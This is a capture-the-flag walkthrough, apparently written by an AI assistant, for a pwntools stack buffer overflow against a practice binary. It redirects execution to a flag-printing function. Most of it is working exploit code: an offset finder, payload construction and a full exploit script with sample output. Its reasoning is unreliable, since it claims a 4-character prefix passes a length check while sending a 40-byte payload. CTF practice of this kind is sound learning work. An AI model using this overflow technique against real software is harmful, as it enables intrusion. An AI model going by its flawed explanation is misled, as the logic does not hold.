To solve this challenge using **pwntools**, we'll perform a **buffer overflow** attack to overwrite the return address in the `check_passwd` function. By overwriting the return address, we can redirect the program's execution flow to the `what_is_this` function, which will print the flag.

Here's a step-by-step guide with code on how to achieve this:

---

### **Step 1: Analyze the Binary**

First, we need to identify the vulnerability and understand how to exploit it.

- **Vulnerable Function**: `check_passwd`
- **Vulnerability**: Buffer overflow due to `strcpy(dest, s)` where `dest` is a fixed-size buffer of 11 bytes (`char dest[11];`), and `s` can be larger than 11 bytes.
- **Goal**: Overwrite the return address of `check_passwd` with the address of `what_is_this` to execute `system("cat flag")`.

---

### **Step 2: Find the Offset to the Return Address**

We need to determine how many bytes we need to overwrite to reach the return address.

**Method**:

- Use a **cyclic pattern** to cause a crash and find the exact offset where the overwrite occurs.

**Code**:

```python
from pwn import *

# Set the context for a 32-bit architecture
context(arch='i386', os='linux')

# Load the binary
elf = ELF('./int')

# Generate a cyclic pattern
pattern = cyclic(100)

# Start the process
p = process('./int')

# Interact with the binary
p.recvuntil('Your choice:')
p.sendline('1')  # Choose 'Login'

p.recvuntil('Please input your username:')
p.sendline('user123')  # Any username

p.recvuntil('Please input your passwd:')
p.sendline('ABCD' + pattern)  # 'ABCD' ensures password length is 4 (passes the length check)

# Wait for the process to crash
p.wait()

# Load the core dump file (usually named 'core')
core = Core('core')

# Extract the crashing address
eip_value = core.eip
print(f"EIP overwritten with: {hex(eip_value)}")

# Find the offset
offset = cyclic_find(eip_value)
print(f"Offset to EIP: {offset}")
```

**Explanation**:

- We send a cyclic pattern after the 4-character password to overflow the buffer.
- After the crash, we extract the value of `EIP` (instruction pointer) to find the offset.
- The `cyclic_find` function determines the exact offset where the overwrite occurs.

**Sample Output**:

```
EIP overwritten with: 0x6161616b
Offset to EIP: 36
```

This means the return address is overwritten after **36** bytes.

---

### **Step 3: Get the Address of `what_is_this` Function**

We need the address of the `what_is_this` function to overwrite the return address.

**Code**:

```python
# Get the address of the 'what_is_this' function
what_is_this_addr = elf.symbols['what_is_this']
print(f"Address of 'what_is_this' function: {hex(what_is_this_addr)}")
```

**Sample Output**:

```
Address of 'what_is_this' function: 0x804868b
```

---

### **Step 4: Craft the Exploit Payload**

Now, we'll create the payload to overwrite the return address with the address of `what_is_this`.

**Code**:

```python
# Build the final payload
password = b'ABCD'  # Password length is 4 to pass the length check
padding = b'A' * (36 - len(password))  # Padding to reach the return address
ret_addr = p32(what_is_this_addr)  # Convert address to little-endian format

payload = password + padding + ret_addr
```

**Explanation**:

- **Password**: `'ABCD'` ensures we pass the length check in `check_passwd`.
- **Padding**: Fills the buffer up to the point before the return address.
- **Return Address**: Overwrite with the address of `what_is_this`.

---

### **Step 5: Write the Complete Exploit Script**

Putting it all together:

```python
from pwn import *

# Set the context
context(arch='i386', os='linux')

# Load the binary
elf = ELF('./int')

# Get the address of 'what_is_this'
what_is_this_addr = elf.symbols['what_is_this']
print(f"Address of 'what_is_this': {hex(what_is_this_addr)}")

# Start the process
p = process('./int')

# Interact with the binary
p.recvuntil('Your choice:')
p.sendline('1')  # Choose 'Login'

p.recvuntil('Please input your username:')
p.sendline('user123')  # Any username

p.recvuntil('Please input your passwd:')

# Build the payload
offset = 36
password = b'ABCD'  # Length between 4 and 8
padding = b'A' * (offset - len(password))
ret_addr = p32(what_is_this_addr)
payload = password + padding + ret_addr

# Send the payload
p.sendline(payload)

# Receive the flag
p.interactive()
```

**Explanation**:

- **p.interactive()**: Allows us to interact with the program after exploiting it, so we can see the flag output.
- Ensure that the lengths and addresses match the ones you obtained from analysis.

---

### **Step 6: Run the Exploit**

Save the script as `exploit.py` and run it:

```bash
python3 exploit.py
```

**Sample Output**:

```
[*] 'int'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
Address of 'what_is_this': 0x804868b
[+] Starting local process './int': pid 12345
[*] Switching to interactive mode
Success
Hello user123

Flag: CTF{example_flag}
```

---

### **Additional Notes**

- **Ensure NX is Disabled**: Since the binary allows execution on the stack, we can execute shellcode if needed. In this case, we're redirecting execution to an existing function, so it's not necessary.
- **ASLR**: If Address Space Layout Randomization (ASLR) is enabled on the system, the addresses might change. Since the binary has no PIE (Position-Independent Executable), the addresses should remain constant.
- **Error Handling**: If the exploit doesn't work, double-check the offset and the address of `what_is_this`.

---

### **Understanding the Exploit**

- **Buffer Overflow**: We're overflowing `dest[11]` in `check_passwd` by providing more data than it can hold.
- **Overwriting Return Address**: By carefully crafting the payload, we overwrite the saved return address on the stack with the address of `what_is_this`.
- **Executing `what_is_this`**: When `check_passwd` returns, execution continues at `what_is_this`, which runs `system("cat flag")`.

---

### **Conclusion**

By following these steps and using pwntools, we've successfully exploited the binary to retrieve the flag. This process demonstrates a classic stack-based buffer overflow attack in a controlled environment, common in CTF competitions.

---

### **References**

- **Pwntools Documentation**: [https://docs.pwntools.com/en/stable/](https://docs.pwntools.com/en/stable/)
- **Understanding Buffer Overflows**: [OWASP Buffer Overflow](https://owasp.org/www-community/vulnerabilities/Buffer_Overflow)

---

This guide should provide you with the necessary steps and code to solve the challenge using pwntools. Good luck with the competition!
